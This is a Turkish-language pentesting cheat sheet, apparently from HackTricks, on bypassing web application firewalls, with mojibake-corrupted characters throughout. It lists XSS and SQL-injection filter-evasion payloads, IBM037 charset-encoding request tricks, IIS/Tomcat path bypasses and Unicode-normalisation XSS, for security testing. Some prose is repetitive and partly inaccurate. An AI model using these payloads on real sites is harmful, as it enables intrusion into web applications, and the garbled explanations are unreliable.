# WAF GeÃ§iÅŸi

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanlÄ±k seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Regex GeÃ§iÅŸleri

FarklÄ± teknikler, gÃ¼venlik duvarlarÄ±ndaki regex filtrelerini geÃ§mek iÃ§in kullanÄ±labilir. Ã–rnekler arasÄ±nda bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf deÄŸiÅŸtirme, satÄ±r sonu eklemek ve payload'larÄ± kodlamak bulunur. FarklÄ± geÃ§iÅŸ teknikleri iÃ§in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) ve [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html) kaynaklarÄ±na bakabilirsiniz. AÅŸaÄŸÄ±daki Ã¶rnekler [bu makaleden](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) alÄ±nmÄ±ÅŸtÄ±r.
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Karakter Seti KodlamasÄ±

Charset encoding, web uygulamalarÄ±nda kullanÄ±lan karakterlerin nasÄ±l kodlandÄ±ÄŸÄ±nÄ± belirleyen bir mekanizmadÄ±r. Bu kodlama, web sunucusu ve tarayÄ±cÄ± arasÄ±nda karakterlerin doÄŸru bir ÅŸekilde iletilmesini saÄŸlar. Ancak, bazÄ± durumlarda karakter seti kodlamasÄ±, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini artÄ±rmak iÃ§in kullanÄ±lan bir gÃ¼venlik Ã¶nlemi olarak da kullanÄ±labilir.

Web uygulamalarÄ±nÄ± hedef alan saldÄ±rganlar, karakter seti kodlamasÄ±nÄ± manipÃ¼le ederek Web Uygulama GÃ¼venlik DuvarÄ±'nÄ± (WAF) atlayabilirler. Bu, saldÄ±rganlarÄ±n zararlÄ± kodlarÄ± veya saldÄ±rÄ± vektÃ¶rlerini gizlemelerine ve web uygulamasÄ±nÄ±n gÃ¼venlik Ã¶nlemlerini aÅŸmalarÄ±na olanak tanÄ±r.

WAF bypass teknikleri arasÄ±nda karakter seti kodlamasÄ±nÄ± manipÃ¼le etmek de bulunur. SaldÄ±rganlar, karakter seti kodlamasÄ±nÄ± deÄŸiÅŸtirerek zararlÄ± kodlarÄ± veya saldÄ±rÄ± vektÃ¶rlerini gizleyebilirler. Bu, WAF'Ä±n zararlÄ± iÃ§eriÄŸi algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r ve saldÄ±rganlara web uygulamasÄ±na eriÅŸim saÄŸlar.

Karakter seti kodlamasÄ±nÄ± manipÃ¼le etmek iÃ§in Ã§eÅŸitli teknikler bulunur. Bunlar arasÄ±nda karakter seti dÃ¶nÃ¼ÅŸÃ¼mÃ¼, karakter seti kaÃ§Ä±ÅŸÄ± ve karakter seti karÄ±ÅŸtÄ±rma gibi yÃ¶ntemler bulunur. SaldÄ±rganlar, bu teknikleri kullanarak WAF'Ä± atlayabilir ve web uygulamasÄ±na zarar verebilirler.

Karakter seti kodlamasÄ± manipÃ¼lasyonu, web uygulamalarÄ±nÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek ve kapatmak iÃ§in kullanÄ±lan bir pentesting tekniÄŸidir. Bu teknik, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini artÄ±rmak ve saldÄ±rÄ±lara karÅŸÄ± korumak iÃ§in Ã¶nemlidir.
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## Obfuskasyon

Obfuskasyon, saldÄ±rganlarÄ±n saldÄ±rÄ±larÄ±nÄ± tespit etmek ve engellemek iÃ§in kullanÄ±lan Web Uygulama GÃ¼venlik DuvarÄ±'nÄ± (WAF) atlatmak iÃ§in kullanÄ±lan bir tekniktir. Obfuskasyon, saldÄ±rÄ±yÄ± gizlemek veya saldÄ±rÄ±yÄ± WAF tarafÄ±ndan algÄ±lanmasÄ±nÄ± zorlaÅŸtÄ±rmak iÃ§in kullanÄ±lan Ã§eÅŸitli yÃ¶ntemleri iÃ§erir.

### Karakter KodlamasÄ±

Karakter kodlamasÄ±, saldÄ±rÄ±yÄ± gizlemek iÃ§in saldÄ±rÄ± dizelerini farklÄ± karakterlerle deÄŸiÅŸtirme iÅŸlemidir. Bu, WAF'Ä±n saldÄ±rÄ±yÄ± algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r. Ã–rneÄŸin, `<script>` ifadesini `&lt;script&gt;` olarak kodlamak, WAF'Ä±n bu ifadeyi algÄ±lamasÄ±nÄ± engeller.

### Karakter Dizisi BirleÅŸtirme

Karakter dizisi birleÅŸtirme, saldÄ±rÄ± dizelerini birden Ã§ok karakter dizisine bÃ¶lmek ve ardÄ±ndan bu karakter dizilerini birleÅŸtirerek saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmektir. Bu, WAF'Ä±n saldÄ±rÄ±yÄ± algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r Ã§Ã¼nkÃ¼ saldÄ±rÄ± dizisi parÃ§alara ayrÄ±ldÄ±ÄŸÄ± iÃ§in bÃ¼tÃ¼n olarak algÄ±lanmaz.

### BÃ¼yÃ¼k/KÃ¼Ã§Ã¼k Harf DeÄŸiÅŸtirme

BÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf deÄŸiÅŸtirme, saldÄ±rÄ± dizelerindeki harfleri bÃ¼yÃ¼k veya kÃ¼Ã§Ã¼k harflerle deÄŸiÅŸtirme iÅŸlemidir. Bu, WAF'Ä±n saldÄ±rÄ±yÄ± algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r Ã§Ã¼nkÃ¼ harflerin bÃ¼yÃ¼k veya kÃ¼Ã§Ã¼k olmasÄ± WAF tarafÄ±ndan farklÄ± ÅŸekilde iÅŸlenir.

### BoÅŸluk Ekleme

BoÅŸluk ekleme, saldÄ±rÄ± dizelerine ekstra boÅŸluk karakterleri eklemektir. Bu, WAF'Ä±n saldÄ±rÄ±yÄ± algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r Ã§Ã¼nkÃ¼ eklenen boÅŸluk karakterleri saldÄ±rÄ±yÄ± deÄŸiÅŸtirir ve WAF'Ä±n saldÄ±rÄ±yÄ± tanÄ±masÄ±nÄ± engeller.

### Karakter Dizisi KarÄ±ÅŸtÄ±rma

Karakter dizisi karÄ±ÅŸtÄ±rma, saldÄ±rÄ± dizelerindeki karakterleri rastgele sÄ±ralamak veya yerlerini deÄŸiÅŸtirmektir. Bu, WAF'Ä±n saldÄ±rÄ±yÄ± algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r Ã§Ã¼nkÃ¼ saldÄ±rÄ± dizisi dÃ¼zeni deÄŸiÅŸtiÄŸi iÃ§in WAF tarafÄ±ndan tanÄ±nmaz.

### HTML Etiketi Ekleme

HTML etiketi ekleme, saldÄ±rÄ± dizelerine HTML etiketleri eklemektir. Bu, WAF'Ä±n saldÄ±rÄ±yÄ± algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r Ã§Ã¼nkÃ¼ eklenen HTML etiketleri saldÄ±rÄ±yÄ± deÄŸiÅŸtirir ve WAF'Ä±n saldÄ±rÄ±yÄ± tanÄ±masÄ±nÄ± engeller.

### URL KodlamasÄ±

URL kodlamasÄ±, saldÄ±rÄ± dizelerini URL kodlamasÄ± kullanarak deÄŸiÅŸtirmektir. Bu, WAF'Ä±n saldÄ±rÄ±yÄ± algÄ±lamasÄ±nÄ± zorlaÅŸtÄ±rÄ±r Ã§Ã¼nkÃ¼ URL kodlamasÄ± kullanÄ±lan saldÄ±rÄ± dizisi WAF tarafÄ±ndan farklÄ± ÅŸekilde iÅŸlenir.
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## Unicode UyumluluÄŸu

Unicode normalizasyonunun uygulamasÄ±na baÄŸlÄ± olarak (daha fazla bilgi iÃ§in [buraya](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), Unicode uyumluluÄŸunu paylaÅŸan karakterler WAF'Ä± atlayabilir ve amaÃ§lanan yÃ¼kÃ¼ Ã§alÄ±ÅŸtÄ±rabilir. Uyumlu karakterler [burada](https://www.compart.com/en/unicode) bulunabilir.

### Ã–rnek
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
## Boyut SÄ±nÄ±rlarÄ±nÄ± AÅŸma

Bulut tabanlÄ± WAF'lerde, yÃ¼k boyutu X'ten bÃ¼yÃ¼kse, istek WAF tarafÄ±ndan kontrol edilmez. BunlarÄ± atlamak iÃ§in sadece bunu kullanabilirsiniz.

### IP DÃ¶nÃ¼ÅŸÃ¼mÃ¼

* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
